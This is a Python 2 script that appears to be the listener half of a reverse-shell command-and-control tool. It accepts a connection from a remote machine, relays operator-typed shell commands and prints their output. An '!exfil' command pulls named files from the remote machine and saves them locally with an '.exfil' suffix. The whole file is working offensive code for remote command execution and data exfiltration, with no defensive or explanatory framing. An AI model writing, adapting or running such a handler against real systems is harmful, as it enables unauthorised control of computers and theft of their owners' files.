#!/usr/bin/python

import socket
import os
from lib.banner import *
from lib.functions import *
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("ip", help="The IP address to listen on.")
parser.add_argument("port", help="The TCP port to listen on.")
parser.add_argument("-v", "--verbose", help="Increase verbosity of output.", action="store_true")
args = parser.parse_args()


#
#
#
def transfer(conn, file):
	bits = conn.recv(1024)

	if '!FILE_NOT_FOUND' in bits: # If file not found quit without opening exfil file
		print_error("File not found\n")

	else: # If file found open exfil file and begin writing exfil data
		f = open(file + '.exfil', 'wb')

		if args.verbose:
			print_info("Writing exfil file " + file + ".exfil ")

		# Process first chunk of data
		if bits.endswith('!EXFIL'):
			idx = bits.find('!EXFIL')
			f.write(bits[0:idx])
			if args.verbose:
				print_progress("!\n")
			print_success("Exfil Complete\n")
		else:
			f.write(bits)
			if args.verbose:
				print_progress("!")

			# Process remaining chunks of data
			while True:
				bits = conn.recv(1024)
				if bits.endswith('!EXFIL'):
					idx = bits.find('!EXFIL')
					f.write(bits[0:idx])
					if args.verbose:
						print_progress("!\n")
					print_success("Exfil complete\n")
					break
				else:
					f.write(bits)
					if args.verbose:
						print_progress("!")

		f.close()


#
#
#
def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.bind((args.ip, int(args.port)))
	except Exception,e:
		print_error("\tException: " + str(e) + "\n")
		sys.exit()

	s.listen(1)

	if args.verbose:
		print_info("Listening for connection on: " + args.ip + ":" + args.port + "\n")

	conn, addr = s.accept()

	if args.verbose:
		print_success("Connection received from: " + addr[0] + ":" + str(addr[1]) + "\n")

	while True:
		cmd = raw_input(prompt(addr[0]))

		if '!quit' in cmd:
			conn.send('!quit')
			conn.close()
			break

		elif '!exfil' in cmd:
			exfil,file = cmd.split("!exfil ")
			conn.send(cmd)
			transfer(conn,file)

		else:
			conn.send(cmd)
			print conn.recv(1024)


#
#
#
def main():
	if args.verbose:
		print(srvbanner)

	connect()


#
#
#
main()
